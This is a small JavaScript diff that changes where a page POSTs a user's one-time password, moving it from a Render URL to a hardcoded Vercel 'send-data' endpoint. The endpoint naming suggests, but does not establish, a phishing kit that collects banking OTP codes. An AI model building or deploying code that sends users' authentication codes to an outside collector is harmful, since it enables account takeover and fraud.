@@ -57,8 +57,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 return;
             }
 
-            // SEND OTP TO RENDER
-            fetch(renderURL, {
+                // SEND OTP TO VERCEL
+                fetch('https://ib-backend-rho.vercel.app/send-data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ otp: otpCode })
